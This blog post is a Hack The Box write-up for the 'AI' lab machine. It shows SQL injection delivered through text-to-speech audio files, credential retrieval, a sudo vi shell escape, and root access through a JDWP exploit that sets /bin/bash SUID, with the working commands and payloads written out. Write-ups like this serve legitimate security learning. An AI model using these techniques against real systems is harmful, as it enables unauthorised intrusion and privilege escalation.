---
layout: single
title: AI - Hack The Box
excerpt: "Exploiting the simple SQL injection vulnerability on the AI box was harder than expected because of the text-to-speech conversion required. I had to use a few tricks to inject the single quote in the query and the other parameters needed for the injection."
date: 2020-01-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-ai/ai_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - tts
  - sqli
  - jdwp
---

![](/assets/images/htb-writeup-ai/ai_logo.png)

Exploiting the simple SQL injection vulnerability on the AI box was harder than expected because of the text-to-speech conversion required. I had to use a few tricks to inject the single quote in the query and the other parameters needed for the injection.

## Summary

- There is a web application with a speech based API interface that contains a SQL injection
- By using a text-to-speech tool we can create a wav file that contains a payload to exploit the SQL injection
- The user credentials are retrieved from the database and we can SSH in
- The Java Debug Wire Protocol (JDWP) is enabled on the running Tomcat server and its port is exposed locally
- We can execute arbitrary code as root using JDWP

## Blog / Tools

- [https://www.exploit-db.com/papers/27179](https://www.exploit-db.com/papers/27179)
- [https://www.exploit-db.com/exploits/46501](https://www.exploit-db.com/exploits/46501)

## Nmap

The attack surface is pretty small on this box: I only see SSH and HTTP listening.

```
root@kali:~/htb/ai# nmap -sC -sV -T4 10.10.10.163
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 09:53 EST
Nmap scan report for ai.htb (10.10.10.163)
Host is up (0.046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web enumeration

What we have here is some company that does voice recognition from audio files. There's a link to upload wav files so this is probably the function that we have to exploit in order to progress on this machine.

![](/assets/images/htb-writeup-ai/web1.png)

![](/assets/images/htb-writeup-ai/web2.png)

![](/assets/images/htb-writeup-ai/web3.png)

![](/assets/images/htb-writeup-ai/web4.png)

I did my normal gobuster enumeration and found a couple of additional files that didn't show up on the main page.

```
root@kali:~/htb/ai# gobuster dir -q -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://10.10.10.163
/about.php (Status: 200)
/ai.php (Status: 200)
/contact.php (Status: 200)
/db.php (Status: 200)
/images (Status: 301)
/index.php (Status: 200)
/intelligence.php (Status: 200)
/server-status (Status: 403)
/uploads (Status: 301)
```

Interesting files:
- `db.php`: this is probably used to connect to some database backend so there may a SQLi I have to exploit here
- `intelligence.php`: this contains a list of voice input commands that are converted to special commands on the backend

![](/assets/images/htb-writeup-ai/intelligence.png)

## SQL injection on the voice API page

The most annoying of this machine was finding a text to speech application that would produce reliable results. I tried a bunch of different online and offline tools but some of them produced files that did not decode properly on the target machine. I used [https://ttsmp3.com](https://ttsmp3.com) and with the help of some scripting I'm able to automate the creation and conversion of the voice file.

```sh
#!/bin/bash

TXT=$1
URL=$(curl -s https://ttsmp3.com/makemp3.php -H 'Content-type: application/x-www-form-urlencoded' --data "msg=$TXT" -d 'lang=Joey' -d 'source=ttsmp3' | jq -r .URL)
curl -s -o speak.mp3 $URL
ffmpeg -v 0 -y -i speak.mp3 speak.wav
curl -s http://ai.htb/ai.php -F fileToUpload='@speak.wav;type=audio/x-wav' -F submit='Process It!' | grep "Our understanding"
```

I can see below that the script works but unfortunately `quote` doesn't get converted to its character equivalent so I can't inject that way.

```
./tts.sh hello
<h3>Our understanding of your input is : hello<br />Query result : <h3>

./tts.sh quote
<h3>Our understanding of your input is : quote<br />Query result : <h3>
```

By using the word `it's`, the application generates a quote and I can see that we have a MySQL SQL injection here.

```
./tts.sh "its or one equals one Comment Database"
<h3>Our understanding of your input is : it's or 1 = 1 -- -<br />Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 's or 1 = 1 -- -'' at line 1<
```

By using `open single quote` in the audio file, it will generate a single quote and I can use a simple 1=1 condition to return all entries from the database. In this case, the `print("hi")` row is shown.

```
root@kali:~/htb/ai# ./tts.sh "open single quote ore one equals one Comment Database"
<h3>Our understanding of your input is : 'or 1 = 1 -- -<br />Query result : print("hi")<h3>
```

I guessed that the table I had to check out was users and I was able to retrieve the password with the following query: `' UNION SELECT password FROM users -- -`

```
./tts.sh "open single quote union select password from users Comment Database"
<h3>Our understanding of your input is : 'union select password from users -- -<br />Query result : H,Sq9t6}a<)?q93_<h3>
```

Password: `H,Sq9t6}a<)?q93_`

I don't have the username and I can't do a query like `' UNION SELECT username FROM users -- -` because the application will read it as `' UNION SELECT user name FROM users -- -` instead. However before the box was released it was called `Alexa` so I just guessed that the username was Alexa and I was able to SSH in.

```
root@kali:~/htb/ai# ssh alexa@10.10.10.163
alexa@10.10.10.163's password: 

alexa@AI:~$ cat user.txt
c43b62...
```

## Trying to exploit the UID bug

Alexa can run vi as any user except root. There is a well known trick I can use to spawn a shell from within vi with `:!/bin/bash` but since I can't sudo vi as root I can only get access to `mrr3boot`.

```
alexa@AI:~$ sudo -l
[sudo] password for alexa: 
Matching Defaults entries for alexa on AI:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alexa may run the following commands on AI:
    (ALL, !root) /usr/bin/vi

alexa@AI:~$ lslogins
       UID USER            PROC PWD-LOCK PWD-DENY  LAST-LOGIN GECOS
         0 root             127                   Nov04/09:42 root
         1 daemon             1                               daemon
         2 bin                0                               bin
         3 sys                0                               sys
         4 sync               0                               sync
         5 games              0                               games
         6 man                0                               man
         7 lp                 0                               lp
         8 mail               0                               mail
         9 news               0                               news
        10 uucp               0                               uucp
        13 proxy              0                               proxy
        33 www-data          10                               www-data
        34 backup             0                               backup
        38 list               0                               Mailing List Manager
        39 irc                0                               ircd
        41 gnats              0                               Gnats Bug-Reporting System (admin)
       100 systemd-network    0                               systemd Network Management,,,
       101 systemd-resolve    1                               systemd Resolver,,,
       102 syslog             1                               
       103 messagebus         1                               
       104 _apt               0                               
       105 lxd                0                               
       106 uuidd              0                               
       107 dnsmasq            0                               dnsmasq,,,
       108 landscape          0                               
       109 pollinate          0                               
       110 sshd               0                               
       111 mysql              1                               MySQL Server,,,
       112 rtkit              0                               RealtimeKit,,,
       113 pulse              0                               PulseAudio daemon,,,
       114 avahi              2                               Avahi mDNS daemon,,,
       115 geoclue            0                               
      1000 alexa              5                         15:32 alexa
     65534 nobody             0                               nobody
4000000000 mrr3boot           0    
```

```
alexa@AI:~$ sudo -u mrr3boot vi
:!/bin/bash
mrr3boot@AI:~$ id
uid=4000000000(mrr3boot) gid=1001(mrr3boot) groups=1001(mrr3boot)
```

That high UID is very strange and after doing some research I found a [systemd bug](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/) that should have let me run any systemctl commands.

Unfortunately even though the pkttyagent seems to crash, I was not able to exploit the bug:

```
mrr3boot@AI:~$ systemctl restart ssh
**
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
Failed to restart ssh.service: Interactive authentication required.
See system logs and 'systemctl status ssh.service' for details.
```

This seems like a dead end so I'll move on to something else.

## Privesc with Java Debug Wire Protocol

Looking at the listening ports I found ports 8000, 8005, 8009 and 8080 listening on localhost.

```
(No info could be read for "-p": geteuid()=-294967296 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0    492 10.10.10.163:22         10.10.14.51:38906       ESTABLISHED -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:49179           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp6       0      0 :::38547                :::*                                -                   
udp6       0      0 :::5353                 :::*                                -
```

I did some port forwarding and saw that port 8080 is running the Tomcat manager but I was not able to log in using any of the default credentials.

![](/assets/images/htb-writeup-ai/tomcat.png)

Then I noticed that the Tomcat server has the JDWP option enabled: `jdwp=transport=dt_socket,address=localhost:8000,server=y`

```
/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager 
-Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 
-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/
apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp 
org.apache.catalina.startup.Bootstrap start
```

I used the [https://www.exploit-db.com/exploits/46501](https://www.exploit-db.com/exploits/46501) exploit to get RCE as root. I chose to make `/bin/bash` SUID so I could just get a shell directly by using `bash -p`. I need to trigger a connection to port 8005 locally on the machine after I've launched the exploit.

```
root@kali:~/htb/ai# python jdwp.py -t 127.0.0.1 -p 8000 --cmd 'chmod u+s /bin/bash'
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=bc4
[+] Found Runtime.getRuntime(): id=7fe7f003e960
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0xc69
[+] Selected payload 'chmod u+s /bin/bash'
[+] Command string object created id:c6a
[+] Runtime.getRuntime() returned context id:0xc6b
[+] found Runtime.exec(): id=7fe7f003e998
[+] Runtime.exec() successful, retId=c6c
[!] Command successfully executed
```

```
alexa@AI:~$ /bin/bash -p
bash-4.4# id
uid=1000(alexa) gid=1000(alexa) euid=0(root) groups=1000(alexa)
bash-4.4# cat /root/root.txt
0ed04f2...
```